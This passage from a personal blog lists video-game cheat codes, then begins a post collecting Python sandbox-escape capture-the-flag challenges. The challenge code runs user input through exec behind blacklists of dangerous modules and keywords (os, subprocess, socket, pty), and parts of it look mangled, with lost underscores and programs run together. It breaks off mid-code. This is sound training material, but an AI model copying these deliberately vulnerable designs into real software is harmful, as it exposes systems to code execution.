<h4 id="TBoGT-Only"><a href="#TBoGT-Only" class="headerlink" title="TBoGT Only"></a>TBoGT Only</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">359-555-7272 parachute</span><br><span class="line">276-555-2666 RPG fist</span><br><span class="line">486-555-2526 RPG sniper</span><br><span class="line">938-555-0150 Floater </span><br><span class="line">625-555-0200 Akuma </span><br><span class="line">625-555-3273 Vader </span><br><span class="line">272-555-8265 APC </span><br><span class="line">359-555-2899 Buzzard </span><br><span class="line">227-555-9666 Bullet GT </span><br></pre></td></tr></table></figure>
<h3 id="GTA-V"><a href="#GTA-V" class="headerlink" title="GTA V"></a>GTA V</h3><p>Three ways to cheat:</p>
<ol>
<li>press <code>~</code> then input</li>
<li>dail the number</li>
<li>directly input</li>
</ol>
<table>
<thead>
<tr>
<th>Phone Number</th>
<th>Cheat Code</th>
<th>Effect</th>
</tr>
</thead>
<tbody><tr>
<td>1-999-724-6545537</td>
<td>painkiller</td>
<td>Invincibility (Last 5 minutes)</td>
</tr>
<tr>
<td>1-999-887-853</td>
<td>turtle</td>
<td>Max Health and Armor</td>
</tr>
<tr>
<td>1-999-769-3787</td>
<td>powerup</td>
<td>Recharge Special Ability</td>
</tr>
<tr>
<td>1-999-2288-463</td>
<td>catchme</td>
<td>Fast Run</td>
</tr>
<tr>
<td>1-999-462-363-4279</td>
<td>incendiary</td>
<td>Flaming Bullets</td>
</tr>
<tr>
<td>1-999-468-42637</td>
<td>hothands</td>
<td>Explosive Melee Attacks</td>
</tr>
<tr>
<td>1-999-756-966</td>
<td>slowmo</td>
<td>Slow Motion (Cycle through 3 levels)</td>
</tr>
<tr>
<td>1-999-332-3393</td>
<td>deadeye</td>
<td>Slow Motion Aim (Cycle through 3 levels)</td>
</tr>
<tr>
<td>1-999-384-48483</td>
<td>fugitive</td>
<td>Raise Wanted Level</td>
</tr>
<tr>
<td>1-999-759-3255</td>
<td>skyfall</td>
<td>Skyfall (Get dropped from high altitude)</td>
</tr>
<tr>
<td>1-999-547-861</td>
<td>liquor</td>
<td>Drunk Mode</td>
</tr>
<tr>
<td>1-999-766-9329</td>
<td>snowday</td>
<td>Slidey Cars</td>
</tr>
<tr>
<td>1-999-356-2837</td>
<td>floater</td>
<td>Moon Gravity</td>
</tr>
<tr>
<td>1-999-6253-48-7246</td>
<td>makeitrain</td>
<td>Change Weather (Cycle through various options)</td>
</tr>
<tr>
<td>1-999-226-348</td>
<td>bandit</td>
<td>Spawn BMX Bike</td>
</tr>
<tr>
<td>1-999-289-9633</td>
<td>buzzoff</td>
<td>Spawn Buzzard Attack Helicopter</td>
</tr>
<tr>
<td>1-999-266-38</td>
<td>comet</td>
<td>Spawn Comet Sports Car</td>
</tr>
<tr>
<td>1-999-846-39663</td>
<td>vinewood</td>
<td>Spawn Limo</td>
</tr>
<tr>
<td>1-999-759-3483</td>
<td>skydive</td>
<td>Give Parachute</td>
</tr>
<tr>
<td>1-999-762-538</td>
<td>rocket</td>
<td>Spawn PCJ Motorbike</td>
</tr>
<tr>
<td>1-999-727-4348</td>
<td>rapidgt</td>
<td>Spawn Rapid GT Sports Car</td>
</tr>
<tr>
<td>1-999-633-7263</td>
<td>offroad</td>
<td>Spawn Sanchez Dirt Bike</td>
</tr>
<tr>
<td>1-999-227-678676</td>
<td>barnstorm</td>
<td>Spawn Stunt Plane</td>
</tr>
<tr>
<td>1-999-872-433</td>
<td>trashed</td>
<td>Spawn Trashmaster</td>
</tr>
<tr>
<td>1-999-5299-3787</td>
<td>lawyerup</td>
<td>Lower Wanted Level</td>
</tr>
<tr>
<td>1-999-866-587</td>
<td>toolup</td>
<td>Give Weapons and Extra Ammo</td>
</tr>
<tr>
<td>1-999-4684-4557</td>
<td>gotgills</td>
<td>Fast Swim</td>
</tr>
<tr>
<td>1-999-467-8648</td>
<td>hoptoit</td>
<td>Super Jump (Hold jump to go higher)</td>
</tr>
<tr>
<td>1-999-444-439</td>
<td>highex</td>
<td>Bang Bang (Explosive bullets)</td>
</tr>
<tr>
<td>1-999-5782-5368</td>
<td>jrtalent</td>
<td>Access Director Mode</td>
</tr>
<tr>
<td>1-999-367-3767</td>
<td>empdrop&#x2F;emperor</td>
<td>Black Cellphones (may cause explosions and other effects)</td>
</tr>
<tr>
<td>1-999-3597-7729</td>
<td>flyspray</td>
<td>Spawn Duster Crop Plane</td>
</tr>
<tr>
<td>1-999-398-4628</td>
<td>extinct</td>
<td>Spawn Dodo Seaplane</td>
</tr>
<tr>
<td>1-999-282-2537</td>
<td>bubbles</td>
<td>Spawn Kraken Sub</td>
</tr>
<tr>
<td>1-999-3328-4227</td>
<td>deathcar</td>
<td>Spawn Duke O’Death</td>
</tr>
<tr>
<td>1-999-4653-461</td>
<td>holein1</td>
<td>Spawn Caddy Golf Cart</td>
</tr>
</tbody></table>
<h2 id="Red-Dead-Redemption-2"><a href="#Red-Dead-Redemption-2" class="headerlink" title="Red Dead Redemption 2"></a>Red Dead Redemption 2</h2><table>
<thead>
<tr>
<th align="center">Cheat Code</th>
<th align="center">Name</th>
<th align="center">Description</th>
<th align="center">Prerequisite</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Abundance is the dullest desire</td>
<td align="center">Infinite Ammo</td>
<td align="center">Grants infinite ammo supply</td>
<td align="center">Newspaper Required: <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/New_Hanover" >New Hanover<i class="fas fa-external-link-alt"></i></a> Gazette No. 27, purchased in <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Valentine" >Valentine<i class="fas fa-external-link-alt"></i></a> during <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Chapter_1" >Chapter 1<i class="fas fa-external-link-alt"></i></a>.</td>
</tr>
<tr>
<td align="center">A simple life, a beautiful death</td>
<td align="center">Simple Weapons</td>
<td align="center">Grants a loadout of basic <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Weapons" >weapons<i class="fas fa-external-link-alt"></i></a></td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">Greed is American Virtue</td>
<td align="center">Heavy Weapons</td>
<td align="center">Adds <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Pump-Action_Shotgun" >Pump-Action Shotgun<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Bolt_Action_Rifle" >Bolt Action Rifle<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Mauser_Pistol" >Mauser Pistol<i class="fas fa-external-link-alt"></i></a>, and <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Semi-Automatic_Pistol" >Semi-Automatic Pistol<i class="fas fa-external-link-alt"></i></a> weapons to your inventory</td>
<td align="center">Newspaper Required: Get newspaper after completing the Chapter 3 mission <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Advertising,_the_New_American_Art" >Advertising, the New American Art<i class="fas fa-external-link-alt"></i></a></td>
</tr>
<tr>
<td align="center">Death is silence</td>
<td align="center">Stealth Weapons</td>
<td align="center">Grants a loadout of stealth weaponry (<a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Machete" >Machete<i class="fas fa-external-link-alt"></i></a>, Throwing&#x2F; Improved&#x2F; and Poison Knives, Tomahawks, Homing Tomahawks)</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">History is written by fools</td>
<td align="center">Gunslinger Weapons</td>
<td align="center">Grants loadout of Gunslinger weapons (Off-hand holster, Double-Action revolver, Schofield Revolver, Double-Barreled Shotgun)</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">You long for sight and see nothing</td>
<td align="center">Fog of War</td>
<td align="center">Reveals entire map</td>
<td align="center">Newspaper Required: Purchase newspaper after completing the Chapter 3 mission <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Blood_Feuds,_Ancient_and_Modern" >Blood Feuds, Ancient and Modern<i class="fas fa-external-link-alt"></i></a></td>
</tr>
<tr>
<td align="center">Greed is now a virtue</td>
<td align="center">Add $500</td>
<td align="center">Adds $500</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">Vanity. All is vanity</td>
<td align="center">Own All Outfits</td>
<td align="center">Unlocks all <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Outfits" >outfits<i class="fas fa-external-link-alt"></i></a> in Arthur’s wardrobe.</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">Eat of Knowledge</td>
<td align="center">Learn All Recipes</td>
<td align="center">Learn All Craft-able Recipes</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">Share</td>
<td align="center">Purchase All <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Camp_Upgrades" >Camp Upgrades<i class="fas fa-external-link-alt"></i></a></td>
<td align="center">Unlocks all <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Ledger" >ledger<i class="fas fa-external-link-alt"></i></a> upgrades and increases max supply levels.</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">Virtue Unearned is not virtue</td>
<td align="center">High Honor</td>
<td align="center">Raises Honor rating</td>
<td align="center">Newspaper Required: Purchase a newspaper after completing the Chapter 4 mission <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Urban_Pleasures" >Urban Pleasures<i class="fas fa-external-link-alt"></i></a>.</td>
</tr>
<tr>
<td align="center">You revel in your disgrace, I see</td>
<td align="center">Decrease Honor</td>
<td align="center">Sets honor to the minimum amount</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">Balance. All is balance</td>
<td align="center">Reset Honor</td>
<td align="center">Activating resets your Honor meter to neutral</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">Be greedy only for foresight</td>
<td align="center">Infinite DeadEye</td>
<td align="center">Unlimited Deadeye reserve</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">The lucky be strong evermore</td>
<td align="center">Infinite Stamina</td>
<td align="center">Unlimited stamina reserve</td>
<td align="center">Newspaper Required: Purchase a newspaper after completing <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Chapter_5" >Chapter 5<i class="fas fa-external-link-alt"></i></a></td>
</tr>
<tr>
<td align="center">Guide me better</td>
<td align="center">Set Dead Eye Level (1)</td>
<td align="center">Allows you to auto-paint targets in Deadeye</td>
<td align="center">None (Discovered by IGN)</td>
</tr>
<tr>
<td align="center">Make me better</td>
<td align="center">Set Dead Eye Level (2)</td>
<td align="center">Allows you to set your level of Deadeye skill to Rank 2 (mark targets in Deadeye)</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">I shall be better</td>
<td align="center">Set Dead Eye Level (3)</td>
<td align="center">Allows you to set your level of Deadeye skill to Rank 3 (You can remain in Deadeye after firing your weapon)</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">I still seek more</td>
<td align="center">Set Dead Eye Level (4)</td>
<td align="center">Allows you to set your level of Deadeye skill to Rank 4  (highlight fatal areas while in Deadeye targeting)</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">I seek and I find</td>
<td align="center">Set Dead Eye Level (5)</td>
<td align="center">Allows you to set your level of Deadeye skill to Rank 5 (highlights fatal and critical hit areas while in Deadeye targeting)</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">You flourish before you die</td>
<td align="center">Set Health, Stamina, and Dead Eye Bars to Full</td>
<td align="center">Refills all bars for health, stamina, and dead eye</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">Seek all the bounty of this place</td>
<td align="center">Increase Health, Stamina and Dead Eye Bar Levels</td>
<td align="center">Increase stat bars</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">You Seek More Than The World Offers</td>
<td align="center">Fortify Health, Stamina and Dead Eye Bars</td>
<td align="center">Refill and Fortify all of your bars</td>
<td align="center">Newspaper Required: Purchase after completing the Chapter 6 mission <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/The_King%27s_Son" >The King’s Son<i class="fas fa-external-link-alt"></i></a>.</td>
</tr>
<tr>
<td align="center">Better than my dog</td>
<td align="center">Increase Horse Whistle Range</td>
<td align="center">You can call your horse from any distance</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">A fool on command</td>
<td align="center">Drunk</td>
<td align="center">Instantly makes you drunk</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">Run! Run! Run!</td>
<td align="center">Create race horse</td>
<td align="center">Spawns a race horse</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">My kingdom is a horse</td>
<td align="center">Increase horse bonding</td>
<td align="center">Increases your bonding with all owned <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Horses" >horses<i class="fas fa-external-link-alt"></i></a></td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">You are a beast built for war</td>
<td align="center">Create <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/War_Horse" >War Horse<i class="fas fa-external-link-alt"></i></a></td>
<td align="center">Spawns a War Horse</td>
<td align="center">Newspaper Required: Purchase after completing the events of the Epilogue.</td>
</tr>
<tr>
<td align="center">The best of the old ways</td>
<td align="center">Create <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Stagecoach" >Stagecoach<i class="fas fa-external-link-alt"></i></a></td>
<td align="center">Spawns a Stagecoach</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">Keep your dreams simple</td>
<td align="center">Create Wagon</td>
<td align="center">Spawns a wagon with one horse</td>
<td align="center">None</td>
</tr>
<tr>
<td align="center">Would you be happier as a clown?</td>
<td align="center">Create Circus Wagon</td>
<td align="center">Spawns a circus wagon</td>
<td align="center">Newspaper Required: Purchase after completing the events of the Epilogue.</td>
</tr>
<tr>
<td align="center">You want more than you have</td>
<td align="center">Create superior horse</td>
<td align="center">Spawns a Rose Grey Bay <a class="link"   href="https://www.ign.com/wikis/red-dead-redemption-2/Arabian" >Arabian<i class="fas fa-external-link-alt"></i></a> Horse</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">You want something new</td>
<td align="center">Create Random Horse</td>
<td align="center">Spawns a horse of randomized breed and coat</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">Keep your dreams light</td>
<td align="center">Create Buggy</td>
<td align="center">Spawns a horse with a cart</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">You want punishment</td>
<td align="center">Increase Wanted Level</td>
<td align="center">Increases your current wanted rating</td>
<td align="center">None (User Submitted)</td>
</tr>
<tr>
<td align="center">You want freedom</td>
<td align="center">Decrease Wanted Level</td>
<td align="center">Reduces your current wanted rating</td>
<td align="center">None (Via Reddit User Foob70)</td>
</tr>
<tr>
<td align="center">You want everyone to go away</td>
<td align="center">Clear All Bounties and Lockdown Areas</td>
<td align="center">Eliminates current wanted status and bounties in towns across the world.</td>
<td align="center">None (Discovered by IGN)</td>
</tr>
</tbody></table>
<h2 id="Human-Fall-Flat"><a href="#Human-Fall-Flat" class="headerlink" title="Human Fall Flat"></a>Human Fall Flat</h2><p>Press <code>~</code> to enter command mode<br><code>FPS</code>           –  change ftp and tps<br><code>climbcheat</code>    –  change climb cheat mode</p>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>note</tag>
        <tag>game</tag>
      </tags>
  </entry>
  <entry>
    <title>Python Sandbox Challenges</title>
    <url>/2019/10/08/2019-10-08-Python-Sandbox-Challenges/</url>
    <content><![CDATA[<p>Here I collect several challenges for training and having fun.</p>
<h2 id="Little-Puzzle"><a href="#Little-Puzzle" class="headerlink" title="Little Puzzle"></a>Little Puzzle</h2><p>Simple training comes first</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> future <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)</span><br><span class="line"></span><br><span class="line">banned = [ </span><br><span class="line">    <span class="string">&quot;import&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pickle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kevin sucks&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>,</span><br><span class="line">    <span class="string">&quot;banned&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cry sum more&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sys&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = builtins.<span class="built_in">dict</span>.keys() </span><br><span class="line">targets.remove(<span class="string">&#x27;raw_input&#x27;</span>) </span><br><span class="line">targets.remove(<span class="string">&#x27;print&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets: </span><br><span class="line">    <span class="keyword">del</span> builtins.<span class="built_in">dict</span>[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>: </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No bueno&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="built_in">exec</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span>():</span></span><br><span class="line">    UNSAFE = [<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;execfile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;reload&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;__import__&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Go Ahead, Expoit me &gt;;D&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">&#x27;\S+&#x27;</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="built_in">exec</span> <span class="string">&#x27;a=&#x27;</span> + inp</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Return Value:&#x27;</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Exception:&#x27;</span>, e</span><br></pre></td></tr></table></figure>

<h2 id="Puzzle-2"><a href="#Puzzle-2" class="headerlink" title="Puzzle 2"></a>Puzzle 2</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> future <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to my Python sandbox! Enter commands below!&quot;</span>)</span><br><span class="line"></span><br><span class="line">banned = [ </span><br><span class="line">    <span class="string">&quot;import&quot;</span>,</span><br><span class="line">    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">    <span class="string">&quot;eval&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pickle&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>,</span><br><span class="line">    <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;kevin sucks&quot;</span>,</span><br><span class="line">    <span class="string">&quot;input&quot;</span>,</span><br><span class="line">    <span class="string">&quot;banned&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cry sum more&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sys&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">targets = builtins.<span class="built_in">dict</span>.keys() </span><br><span class="line">targets.remove(<span class="string">&#x27;raw_input&#x27;</span>) </span><br><span class="line">targets.remove(<span class="string">&#x27;print&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets: </span><br><span class="line">    <span class="keyword">del</span> builtins.<span class="built_in">dict</span>[x]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>: </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No bueno&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="built_in">exec</span> data</span><br></pre></td></tr></table></figure>
<h2 id="Puzzle-3"><a href="#Puzzle-3" class="headerlink" title="Puzzle 3"></a>Puzzle 3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span>():</span></span><br><span class="line">    UNSAFE = [<span class="string">&#x27;open&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;file&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;execfile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;compile&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;reload&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;__import__&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;eval&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;input&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Go Ahead, Expoit me &gt;;D&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Read user input until the first whitespace character</span></span><br><span class="line">        inp = findall(<span class="string">&#x27;\S+&#x27;</span>, raw_input())[<span class="number">0</span>]</span><br><span class="line">        a = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="built_in">exec</span> <span class="string">&#x27;a=&#x27;</span> + inp</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Return Value:&#x27;</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;Exception:&#x27;</span>, e</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="ISCC-2016-Pwn300-pycalc"><a href="#ISCC-2016-Pwn300-pycalc" class="headerlink" title="ISCC 2016 - Pwn300 pycalc"></a>ISCC 2016 - Pwn300 pycalc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">banner</span>():</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;   Simple calculator implemented by python   &quot;</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;=============================================&quot;</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getexp</span>():</span></span><br><span class="line">    <span class="keyword">return</span> raw_input(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_hook_import_</span>(<span class="params">name, *args, **kwargs</span>):</span></span><br><span class="line">    module_blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;bdb&#x27;</span>, <span class="string">&#x27;bsddb&#x27;</span>, <span class="string">&#x27;cgi&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;CGIHTTPServer&#x27;</span>, <span class="string">&#x27;cgitb&#x27;</span>, <span class="string">&#x27;compileall&#x27;</span>, <span class="string">&#x27;ctypes&#x27;</span>, <span class="string">&#x27;dircache&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;doctest&#x27;</span>, <span class="string">&#x27;dumbdbm&#x27;</span>, <span class="string">&#x27;filecmp&#x27;</span>, <span class="string">&#x27;fileinput&#x27;</span>, <span class="string">&#x27;ftplib&#x27;</span>, <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;getopt&#x27;</span>, <span class="string">&#x27;getpass&#x27;</span>, <span class="string">&#x27;gettext&#x27;</span>, <span class="string">&#x27;httplib&#x27;</span>, <span class="string">&#x27;importlib&#x27;</span>, <span class="string">&#x27;imputil&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;linecache&#x27;</span>, <span class="string">&#x27;macpath&#x27;</span>, <span class="string">&#x27;mailbox&#x27;</span>, <span class="string">&#x27;mailcap&#x27;</span>, <span class="string">&#x27;mhlib&#x27;</span>, <span class="string">&#x27;mimetools&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;mimetypes&#x27;</span>, <span class="string">&#x27;modulefinder&#x27;</span>, <span class="string">&#x27;multiprocessing&#x27;</span>, <span class="string">&#x27;netrc&#x27;</span>, <span class="string">&#x27;new&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;optparse&#x27;</span>, <span class="string">&#x27;pdb&#x27;</span>, <span class="string">&#x27;pipes&#x27;</span>, <span class="string">&#x27;pkgutil&#x27;</span>, <span class="string">&#x27;platform&#x27;</span>, <span class="string">&#x27;popen2&#x27;</span>, <span class="string">&#x27;poplib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;posix&#x27;</span>, <span class="string">&#x27;posixfile&#x27;</span>, <span class="string">&#x27;profile&#x27;</span>, <span class="string">&#x27;pstats&#x27;</span>, <span class="string">&#x27;pty&#x27;</span>, <span class="string">&#x27;py_compile&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;pyclbr&#x27;</span>, <span class="string">&#x27;pydoc&#x27;</span>, <span class="string">&#x27;rexec&#x27;</span>, <span class="string">&#x27;runpy&#x27;</span>, <span class="string">&#x27;shlex&#x27;</span>, <span class="string">&#x27;shutil&#x27;</span>, <span class="string">&#x27;SimpleHTTPServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;SimpleXMLRPCServer&#x27;</span>, <span class="string">&#x27;site&#x27;</span>, <span class="string">&#x27;smtpd&#x27;</span>, <span class="string">&#x27;socket&#x27;</span>, <span class="string">&#x27;SocketServer&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;sysconfig&#x27;</span>, <span class="string">&#x27;tabnanny&#x27;</span>, <span class="string">&#x27;tarfile&#x27;</span>, <span class="string">&#x27;telnetlib&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;tempfile&#x27;</span>, <span class="string">&#x27;Tix&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>, <span class="string">&#x27;turtle&#x27;</span>, <span class="string">&#x27;urllib&#x27;</span>, <span class="string">&#x27;urllib2&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;uu&#x27;</span>, <span class="string">&#x27;webbrowser&#x27;</span>, <span class="string">&#x27;whichdb&#x27;</span>, <span class="string">&#x27;zipfile&#x27;</span>, <span class="string">&#x27;zipimport&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> forbid <span class="keyword">in</span> module_blacklist:</span><br><span class="line">        <span class="keyword">if</span> name == forbid:        <span class="comment"># don&#x27;t let user import these modules</span></span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;No you can\&#x27; import &#123;0&#125;!!!&#x27;</span>.<span 